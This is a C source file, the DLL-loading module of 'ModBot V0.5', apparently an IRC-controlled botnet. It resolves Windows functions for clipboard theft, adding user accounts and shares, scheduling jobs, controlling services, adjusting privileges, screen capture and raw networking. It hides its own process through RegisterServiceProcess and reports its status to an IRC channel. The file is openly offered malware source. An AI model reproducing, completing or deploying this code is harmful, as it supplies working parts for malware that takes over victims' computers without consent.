/////////////////////////////////////////////////
//            120|-[ModBot]-V0.5               //
///////////////////////////////////////////////// 
#include "Inc.h"
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
SEM fSetErrorMode;
CT32S fCreateToolhelp32Snapshot;
P32F fProcess32First;
P32N fProcess32Next;
M32F fModule32First;
GDFSE fGetDiskFreeSpaceEx;
GLDS fGetLogicalDriveStrings;
GDT fGetDriveType;
SP fSearchPath;
QPC fQueryPerformanceCounter;
QPF fQueryPerformanceFrequency;
RSP fRegisterServiceProcess;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
SM fSendMessage;
FW fFindWindow;
IW fIsWindow;
DW fDestroyWindow;
OC fOpenClipboard;
GCD fGetClipboardData;
CC fCloseClipboard;
EWE fExitWindowsEx;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
ROKE fRegOpenKeyEx;
RCKE fRegCreateKeyEx;
RSVE fRegSetValueEx;
RQVE fRegQueryValueEx;
RDV fRegDeleteValue;
RCK fRegCloseKey;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_PROCESS
OPT fOpenProcessToken;
LPV fLookupPrivilegeValue;
ATP fAdjustTokenPrivileges;
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_NET
OSCM fOpenSCManager;
OS fOpenService;
SS fStartService;
CS fControlService;
DS fDeleteService;
CSH fCloseServiceHandle;
ESS fEnumServicesStatus;
IVSD fIsValidSecurityDescriptor;
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_SYSINFO
GUN fGetUserName;
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
CDC fCreateDC;
CDIBS fCreateDIBSection;
CCDC fCreateCompatibleDC;
GDC fGetDeviceCaps;
GDIBCT fGetDIBColorTable;
SO fSelectObject;
BB fBitBlt;
DDC fDeleteDC;
DO fDeleteObject;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
WSAS fWSAStartup;
WSASo fWSASocket;
WSAAS fWSAAsyncSelect;
WSAFDIS __fWSAFDIsSet;
WSAI fWSAIoctl;
WSAGLE fWSAGetLastError;
WSAC fWSACleanup;
SOCK fsocket;
IOCTLS fioctlsocket;
CON fconnect;
INTOA finet_ntoa;
IADDR finet_addr;
HTONS fhtons;
HTONL fhtonl;
NTOHS fntohs;
NTOHL fntohl;
SEND fsend;
SENDTO fsendto;
RECV frecv;
RECVFROM frecvfrom;
BIND fbind;
SEL fselect;
LIS flisten;
ACC faccept;
SSO fsetsockopt;
GSN fgetsockname;
GHN fgethostname;
GHBN fgethostbyname;
GHBA fgethostbyaddr;
GPN fgetpeername;
CLSO fclosesocket;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
IGCS fInternetGetConnectedState;
IGCSE fInternetGetConnectedStateEx;
HOR fHttpOpenRequest;
HSR fHttpSendRequest;
IC fInternetConnect;
IO fInternetOpen;
IOU fInternetOpenUrl;
ICU fInternetCrackUrl;
IRF fInternetReadFile;
ICH fInternetCloseHandle;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
HANDLE ih;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_PING
ICF fIcmpCreateFile;
ISE fIcmpSendEcho;
ICH fIcmpCloseHandle;
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
NSA fNetShareAdd;
NSD fNetShareDel;
NSE fNetShareEnum;
NSJA fNetScheduleJobAdd;
NABF fNetApiBufferFree;
NRTOD fNetRemoteTOD;
NUA fNetUserAdd;
NUD fNetUserDel;
NUE fNetUserEnum;
NUGI fNetUserGetInfo;
NMBS fNetMessageBufferSend;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
DFRC fDnsFlushResolverCache;
DFRCEA fDnsFlushResolverCacheEntry_A;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
GINT fGetIpNetTable;
DINE fDeleteIpNetEntry;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
WNAC2 fWNetAddConnection2;
WNAC2W fWNetAddConnection2W;
WNCC2 fWNetCancelConnection2;
WNCC2W fWNetCancelConnection2W;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
SE fShellExecute;
SHCN fSHChangeNotify;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
SQLDC fSQLDriverConnect;
SQLSEA fSQLSetEnvAttr;
SQLED fSQLExecDirect;
SQLAH fSQLAllocHandle;
SQLFH fSQLFreeHandle;
SQLD fSQLDisconnect;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
BOOL nokernel32 = FALSE;
DWORD nokernel32err = 0;
BOOL nouser32 = FALSE;
DWORD nouser32err = 0;
BOOL noadvapi32 = FALSE;
DWORD noadvapi32err = 0;
BOOL nogdi32 = FALSE;
DWORD nogdi32err = 0;
BOOL nows2_32 = FALSE;
DWORD nows2_32err = 0;
BOOL nowininet = FALSE;
DWORD nowinineterr = 0;
BOOL noicmp = FALSE;
DWORD noicmperr = 0;
BOOL nonetapi32 = FALSE;
DWORD nonetapi32err = 0;
BOOL nodnsapi = FALSE;
DWORD nodnsapierr = 0;
BOOL noiphlpapi = FALSE;
DWORD noiphlpapierr = 0;
BOOL nompr = FALSE;
DWORD nomprerr = 0;
BOOL noshell32 = FALSE;
DWORD noshell32err = 0;
BOOL noodbc32 = FALSE;
DWORD noodbc32err = 0;
BOOL noavicap32 = FALSE;
DWORD noavicap32err = 0;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
BOOL LoadDLLs(void) 
{
	HMODULE kernel32_dll = GetModuleHandle("kernel32.dll");
	if (kernel32_dll) {
		fSetErrorMode = (SEM)GetProcAddress(kernel32_dll, "SetErrorMode");
		fCreateToolhelp32Snapshot = (CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot");
		fProcess32First = (P32F)GetProcAddress(kernel32_dll, "Process32First");
		fProcess32Next = (P32N)GetProcAddress(kernel32_dll, "Process32Next");
		fModule32First = (M32F)GetProcAddress(kernel32_dll, "Module32First");
		fGetDiskFreeSpaceEx = (GDFSE)GetProcAddress(kernel32_dll, "GetDiskFreeSpaceExA");
		fGetLogicalDriveStrings = (GLDS)GetProcAddress(kernel32_dll, "GetLogicalDriveStringsA");
		fGetDriveType = (GDT)GetProcAddress(kernel32_dll, "GetDriveTypeA");
		fSearchPath = (SP)GetProcAddress(kernel32_dll, "SearchPathA");
		fQueryPerformanceCounter = (QPC)GetProcAddress(kernel32_dll, "QueryPerformanceCounter");
		fQueryPerformanceFrequency = (QPF)GetProcAddress(kernel32_dll, "QueryPerformanceFrequency");

		if (!fSetErrorMode || !fCreateToolhelp32Snapshot || !fProcess32First || !fProcess32Next 
			|| !fGetDiskFreeSpaceEx || !fGetLogicalDriveStrings || !fGetDriveType || !fSearchPath 
			|| !fQueryPerformanceCounter || !fQueryPerformanceFrequency)
			nokernel32 = TRUE;

		fRegisterServiceProcess = (RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");
		if (fRegisterServiceProcess) 
			fRegisterServiceProcess(0, 1);
	} else {
		nokernel32err = GetLastError();
		nokernel32 = TRUE;
	}
 	HMODULE user32_dll = LoadLibrary("user32.dll");
    if (user32_dll) {
		fSendMessage = (SM)GetProcAddress(user32_dll,"SendMessageA");
		fFindWindow = (FW)GetProcAddress(user32_dll,"FindWindowA");
		fIsWindow = (IW)GetProcAddress(user32_dll,"IsWindow");
		fDestroyWindow = (DW)GetProcAddress(user32_dll,"DestroyWindow");
		fOpenClipboard = (OC)GetProcAddress(user32_dll,"OpenClipboard");
		fGetClipboardData = (GCD)GetProcAddress(user32_dll,"GetClipboardData");
		fCloseClipboard = (CC)GetProcAddress(user32_dll,"CloseClipboard");
		fExitWindowsEx = (EWE)GetProcAddress(user32_dll,"ExitWindowsEx");

		if (!fSendMessage || !fFindWindow || !fIsWindow || !fDestroyWindow 
			|| !fOpenClipboard || !fGetClipboardData || !fCloseClipboard
			|| !fExitWindowsEx)
	        nouser32 = TRUE;

	} else {
		nouser32err = GetLastError();
		nouser32 = TRUE;
	}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
 	HMODULE advapi32_dll = GetModuleHandle("advapi32.dll");
    if (advapi32_dll) {
		fRegOpenKeyEx = (ROKE)GetProcAddress(advapi32_dll,"RegOpenKeyExA");
		fRegCreateKeyEx = (RCKE)GetProcAddress(advapi32_dll,"RegCreateKeyExA");
		fRegSetValueEx = (RSVE)GetProcAddress(advapi32_dll,"RegSetValueExA");
		fRegQueryValueEx = (RQVE)GetProcAddress(advapi32_dll,"RegQueryValueExA");
		fRegDeleteValue = (RDV)GetProcAddress(advapi32_dll,"RegDeleteValueA");
		fRegCloseKey = (RCK)GetProcAddress(advapi32_dll,"RegCloseKey");

		if (!fRegOpenKeyEx || !fRegCreateKeyEx || !fRegSetValueEx 
			|| !fRegQueryValueEx || !fRegDeleteValue || !fRegCloseKey)
	        noadvapi32 = TRUE;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
		#ifndef NO_PROCESS
		fOpenProcessToken = (OPT)GetProcAddress(advapi32_dll,"OpenProcessToken");
		fLookupPrivilegeValue = (LPV)GetProcAddress(advapi32_dll,"LookupPrivilegeValueA");
		fAdjustTokenPrivileges = (ATP)GetProcAddress(advapi32_dll,"AdjustTokenPrivileges");

		if (!fOpenProcessToken || !fLookupPrivilegeValue || !fAdjustTokenPrivileges) 
	        noadvapi32 = TRUE;		
		#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
	
		#ifndef NO_NET
	 	fOpenSCManager = (OSCM)GetProcAddress(advapi32_dll,"OpenSCManagerA");
	 	fOpenService = (OS)GetProcAddress(advapi32_dll,"OpenServiceA");
	 	fStartService = (SS)GetProcAddress(advapi32_dll,"StartServiceA");
	 	fControlService = (CS)GetProcAddress(advapi32_dll,"ControlService");
	 	fDeleteService = (DS)GetProcAddress(advapi32_dll,"DeleteService");
	 	fCloseServiceHandle = (CSH)GetProcAddress(advapi32_dll,"CloseServiceHandle");
	 	fEnumServicesStatus = (ESS)GetProcAddress(advapi32_dll,"EnumServicesStatusA");
		fIsValidSecurityDescriptor = (IVSD)GetProcAddress(advapi32_dll,"IsValidSecurityDescriptor");
		if (!fOpenSCManager || !fOpenService || !fStartService || !fControlService 
			|| !fDeleteService || !fCloseServiceHandle || !fEnumServicesStatus || !fIsValidSecurityDescriptor)
	        noadvapi32 = TRUE;
		#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
		#ifndef NO_SYSINFO
		fGetUserName = (GUN)GetProcAddress(advapi32_dll,"GetUserNameA");
		if (!fGetUserName)
			noadvapi32 = TRUE;
		#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
	} else {
		noadvapi32err = GetLastError();
		noadvapi32 = TRUE;
	}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
 	HMODULE gdi32_dll = GetModuleHandle("gdi32.dll");
    if (gdi32_dll) {
		fCreateDC = (CDC)GetProcAddress(gdi32_dll,"CreateDCA");
		fCreateDIBSection = (CDIBS)GetProcAddress(gdi32_dll,"CreateDIBSection");
		fCreateCompatibleDC = (CCDC)GetProcAddress(gdi32_dll,"CreateCompatibleDC");
		fGetDeviceCaps = (GDC)GetProcAddress(gdi32_dll,"GetDeviceCaps");
		fGetDIBColorTable = (GDIBCT)GetProcAddress(gdi32_dll,"GetDIBColorTable");
		fSelectObject = (SO)GetProcAddress(gdi32_dll,"SelectObject");
		fBitBlt = (BB)GetProcAddress(gdi32_dll,"BitBlt");
		fDeleteDC = (DDC)GetProcAddress(gdi32_dll,"DeleteDC");
		fDeleteObject = (DO)GetProcAddress(gdi32_dll,"DeleteObject");

		if (!fCreateDC || !fCreateDIBSection || !fCreateCompatibleDC || !fGetDeviceCaps 
			|| !fGetDIBColorTable || !fSelectObject || !fBitBlt || !fDeleteDC || !fDeleteObject)
	        nogdi32 = TRUE;
	} else {
		nogdi32err = GetLastError();
		nogdi32 = TRUE;
	}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
 	HMODULE ws2_32_dll = LoadLibrary("ws2_32.dll");
    if (ws2_32_dll) {
	 	fWSAStartup = (WSAS)GetProcAddress(ws2_32_dll,"WSAStartup");
		fWSASocket = (WSASo)GetProcAddress(ws2_32_dll,"WSASocketA");
		fWSAAsyncSelect = (WSAAS)GetProcAddress(ws2_32_dll,"WSAAsyncSelect");
		__fWSAFDIsSet = (WSAFDIS)GetProcAddress(ws2_32_dll,"__WSAFDIsSet");
		fWSAIoctl = (WSAI)GetProcAddress(ws2_32_dll,"WSAIoctl");
		fWSAGetLastError = (WSAGLE)GetProcAddress(ws2_32_dll,"WSAGetLastError");
		fWSACleanup = (WSAC)GetProcAddress(ws2_32_dll,"WSACleanup");
  		fsocket = (SOCK)GetProcAddress(ws2_32_dll,"socket");
		fioctlsocket = (IOCTLS)GetProcAddress(ws2_32_dll,"ioctlsocket");
		fconnect = (CON)GetProcAddress(ws2_32_dll,"connect");
		finet_ntoa = (INTOA)GetProcAddress(ws2_32_dll,"inet_ntoa");
		finet_addr = (IADDR)GetProcAddress(ws2_32_dll,"inet_addr");
		fhtons = (HTONS)GetProcAddress(ws2_32_dll,"htons");
		fhtonl = (HTONL)GetProcAddress(ws2_32_dll,"htonl");
		fntohs = (NTOHS)GetProcAddress(ws2_32_dll,"ntohs");
		fntohl = (NTOHL)GetProcAddress(ws2_32_dll,"ntohl");
		fsend = (SEND)GetProcAddress(ws2_32_dll,"send");
		fsendto = (SENDTO)GetProcAddress(ws2_32_dll,"sendto");
		frecv = (RECV)GetProcAddress(ws2_32_dll,"recv");
		frecvfrom = (RECVFROM)GetProcAddress(ws2_32_dll,"recvfrom");
		fbind = (BIND)GetProcAddress(ws2_32_dll,"bind");
		fselect = (SEL)GetProcAddress(ws2_32_dll,"select");
		flisten = (LIS)GetProcAddress(ws2_32_dll,"listen");
		faccept = (ACC)GetProcAddress(ws2_32_dll,"accept");
		fsetsockopt = (SSO)GetProcAddress(ws2_32_dll,"setsockopt");
		fgetsockname = (GSN)GetProcAddress(ws2_32_dll,"getsockname");
		fgethostname = (GHN)GetProcAddress(ws2_32_dll,"gethostname");
		fgethostbyname = (GHBN)GetProcAddress(ws2_32_dll,"gethostbyname");
		fgethostbyaddr = (GHBA)GetProcAddress(ws2_32_dll,"gethostbyaddr");
		fgetpeername = (GPN)GetProcAddress(ws2_32_dll,"getpeername");
		fclosesocket = (CLSO)GetProcAddress(ws2_32_dll,"closesocket");

		if (!fWSAStartup || !fWSASocket || !fWSAAsyncSelect || !fWSAIoctl || !fWSAGetLastError 
			|| !fWSACleanup || !fsocket || !fioctlsocket || !fconnect || !finet_ntoa || !finet_addr
			|| !fhtons || !fhtonl || !fntohs || !fsend || !fsendto || !frecv || !frecvfrom || !fbind
			|| !fselect || !flisten || !faccept || !fsetsockopt || !fgetsockname || !fgethostname
			|| !fgethostbyname || !fgethostbyaddr || !fclosesocket)	
	        nows2_32 = TRUE;
	} else {
		nows2_32err = GetLastError();
		nows2_32 = TRUE;
	}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
	HMODULE wininet_dll = LoadLibrary("wininet.dll");
    if (wininet_dll) {
		fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");
	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
	 	fHttpOpenRequest = (HOR)GetProcAddress(wininet_dll, "HttpOpenRequestA");
	 	fHttpSendRequest = (HSR)GetProcAddress(wininet_dll, "HttpSendRequestA");
	 	fInternetConnect = (IC)GetProcAddress(wininet_dll, "InternetConnectA");
	 	fInternetOpen = (IO)GetProcAddress(wininet_dll, "InternetOpenA");
	 	fInternetOpenUrl = (IOU)GetProcAddress(wininet_dll, "InternetOpenUrlA");
	 	fInternetCrackUrl = (ICU)GetProcAddress(wininet_dll, "InternetCrackUrlA");
	 	fInternetReadFile = (IRF)GetProcAddress(wininet_dll, "InternetReadFile");
	 	fInternetCloseHandle = (ICH)GetProcAddress(wininet_dll, "InternetCloseHandle");

		if (!fInternetGetConnectedState || !fInternetGetConnectedStateEx || !fHttpOpenRequest 
			|| !fHttpSendRequest || !fInternetConnect || !fInternetOpen || !fInternetOpenUrl
			|| !fInternetCrackUrl || !fInternetReadFile || !fInternetCloseHandle) 
			nowininet = TRUE;

		if (fInternetOpen) {
				ih = fInternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
				if (ih == NULL) ih = 0;
		}
	} else {
		nowinineterr = GetLastError();
		nowininet = TRUE;
		ih = 0;
	}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
	#ifndef NO_PING
 	HMODULE icmp_dll = LoadLibrary("icmp.dll");
    if (icmp_dll) {
	 	fIcmpCreateFile = (ICF)GetProcAddress(icmp_dll,"IcmpCreateFile");
 		fIcmpCloseHandle = (ICH)GetProcAddress(icmp_dll,"IcmpCloseHandle");
 		fIcmpSendEcho = (ISE)GetProcAddress(icmp_dll,"IcmpSendEcho");

		if (!fIcmpCreateFile || !fIcmpCloseHandle || !fIcmpSendEcho)
	        noicmp = TRUE;
	} else {
		noicmperr = GetLastError();
		noicmp = TRUE;
	}
	#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
 	HMODULE netapi32_dll = LoadLibrary("netapi32.dll");
    if (netapi32_dll) {
	 	fNetShareAdd = (NSA)GetProcAddress(netapi32_dll,"NetShareAdd");
	 	fNetShareDel = (NSD)GetProcAddress(netapi32_dll,"NetShareDel");
		fNetShareEnum = (NSE)GetProcAddress(netapi32_dll,"NetShareEnum");
	 	fNetScheduleJobAdd = (NSJA)GetProcAddress(netapi32_dll,"NetScheduleJobAdd");
	 	fNetApiBufferFree = (NABF)GetProcAddress(netapi32_dll,"NetApiBufferFree");
	 	fNetRemoteTOD = (NRTOD)GetProcAddress(netapi32_dll,"NetRemoteTOD");
	 	fNetUserAdd = (NUA)GetProcAddress(netapi32_dll,"NetUserAdd");
	 	fNetUserDel = (NUD)GetProcAddress(netapi32_dll,"NetUserDel");
	 	fNetUserEnum = (NUE)GetProcAddress(netapi32_dll,"NetUserEnum");
	 	fNetUserGetInfo = (NUGI)GetProcAddress(netapi32_dll,"NetUserGetInfo");
		fNetMessageBufferSend = (NMBS)GetProcAddress(netapi32_dll,"NetMessageBufferSend");
		
		if (!fNetShareAdd || !fNetShareDel || !fNetShareEnum || !fNetScheduleJobAdd 
			|| !fNetApiBufferFree || !fNetRemoteTOD || !fNetUserAdd || !fNetUserDel
			|| !fNetUserEnum || !fNetUserGetInfo || !fNetMessageBufferSend)	
	        nonetapi32 = TRUE;
	} else {
		nonetapi32err = GetLastError();
		nonetapi32 = TRUE;
	}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
 	HMODULE dnsapi_dll = LoadLibrary("dnsapi.dll");
    if (dnsapi_dll) {
	 	fDnsFlushResolverCache = (DFRC)GetProcAddress(dnsapi_dll,"DnsFlushResolverCache");
	 	fDnsFlushResolverCacheEntry_A = (DFRCEA)GetProcAddress(dnsapi_dll,"DnsFlushResolverCacheEntry_A");

		if (!fDnsFlushResolverCache || !fDnsFlushResolverCacheEntry_A)
	        nodnsapi = TRUE;
	} else {
		nodnsapierr = GetLastError();
		nodnsapi = TRUE;
	}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
 	HMODULE iphlpapi_dll = LoadLibrary("iphlpapi.dll");
    if (iphlpapi_dll) {
	 	fGetIpNetTable = (GINT)GetProcAddress(iphlpapi_dll,"GetIpNetTable");
	 	fDeleteIpNetEntry = (DINE)GetProcAddress(iphlpapi_dll,"DeleteIpNetEntry");

		if (!fGetIpNetTable || !fDeleteIpNetEntry)	
	        noiphlpapi = TRUE;
	} else {
		noiphlpapierr = GetLastError();
		noiphlpapi = TRUE;
	}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
 	HMODULE mpr_dll = LoadLibrary("mpr.dll");
    if (mpr_dll) {
	 	fWNetAddConnection2 = (WNAC2)GetProcAddress(mpr_dll,"WNetAddConnection2A");
	 	fWNetAddConnection2W = (WNAC2W)GetProcAddress(mpr_dll,"WNetAddConnection2W");
	 	fWNetCancelConnection2 = (WNCC2)GetProcAddress(mpr_dll,"WNetCancelConnection2A");
	 	fWNetCancelConnection2W = (WNCC2W)GetProcAddress(mpr_dll,"WNetCancelConnection2W");

		if (!fWNetAddConnection2 || !fWNetAddConnection2W 
			|| !fWNetCancelConnection2 || !fWNetCancelConnection2W)	
	        nompr = TRUE;
	} else {
		nomprerr = GetLastError();
		nompr = TRUE;
	}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
 	HMODULE shell32_dll = LoadLibrary("shell32.dll");
    if (shell32_dll) {
	 	fShellExecute = (SE)GetProcAddress(shell32_dll,"ShellExecuteA");
		fSHChangeNotify = (SHCN)GetProcAddress(shell32_dll,"SHChangeNotify");
 
		if (!fShellExecute || !fSHChangeNotify)
	        noshell32 = TRUE;
	} else {
		noshell32err = GetLastError();
		noshell32 = TRUE;
	}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
 	HMODULE odbc32_dll = LoadLibrary("odbc32.dll");
    if (odbc32_dll) {
	 	fSQLDriverConnect = (SQLDC)GetProcAddress(odbc32_dll,"SQLDriverConnect");
	 	fSQLSetEnvAttr = (SQLSEA)GetProcAddress(odbc32_dll,"SQLSetEnvAttr");
	 	fSQLExecDirect = (SQLED)GetProcAddress(odbc32_dll,"SQLExecDirect");
	 	fSQLAllocHandle = (SQLAH)GetProcAddress(odbc32_dll,"SQLAllocHandle");
	 	fSQLFreeHandle = (SQLFH)GetProcAddress(odbc32_dll,"SQLFreeHandle");
	 	fSQLDisconnect = (SQLD)GetProcAddress(odbc32_dll,"SQLDisconnect");
 
		if (!fSQLDriverConnect || !fSQLSetEnvAttr || !fSQLExecDirect
			|| !fSQLAllocHandle || !fSQLFreeHandle || !fSQLDisconnect)
	        noodbc32 = TRUE;
	} else {
		noodbc32err = GetLastError();
		noodbc32 = TRUE;
	}
		
	return TRUE;
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
void CheckDLLs(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	char sendbuf[IRCLINE];

	if (nokernel32) {
		sprintf(sendbuf,"Kernel32.dll failed. <%d>", nokernel32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nouser32) {
		sprintf(sendbuf,"User32.dll failed. <%d>", nouser32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (noadvapi32) {
		sprintf(sendbuf,"Advapi32.dll failed. <%d>", noadvapi32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nogdi32) {
		sprintf(sendbuf,"Gdi32.dll failed. <%d>", nogdi32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nows2_32) {
		sprintf(sendbuf,"Ws2_32.dll failed. <%d>", nows2_32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nowininet) {
		sprintf(sendbuf,"Wininet.dll failed. <%d>", nowinineterr);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (noicmp) {
		sprintf(sendbuf,"Icmp.dll failed. <%d>", noicmperr);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nonetapi32) {
		sprintf(sendbuf,"Netapi32.dll failed. <%d>", nonetapi32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nodnsapi) {
		sprintf(sendbuf,"Dnsapi.dll failed. <%d>", nodnsapierr);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (noiphlpapi) {
		sprintf(sendbuf,"Iphlpapi.dll failed. <%d>", noiphlpapierr);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nompr) {
		sprintf(sendbuf,"Mpr32.dll failed. <%d>", nomprerr);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (noshell32) {
		sprintf(sendbuf,"Shell32.dll failed. <%d>", noshell32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (noodbc32) {
		sprintf(sendbuf,"Odbc32.dll failed. <%d>", noodbc32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
	#ifndef NO_CAPTURE
	if (noavicap32) {
		sprintf(sendbuf,"Avicap32.dll failed. <%d>", noavicap32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
	sprintf(sendbuf,"[MAIN]: DLL test complete.");
	if (!silent) irc_privmsg(sock, chan, sendbuf, notice); 
	addlog(sendbuf);
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
	return;
}
/////////////////////////////////////////////////
//            120|-[ModBot]-V0.5               //
///////////////////////////////////////////////// 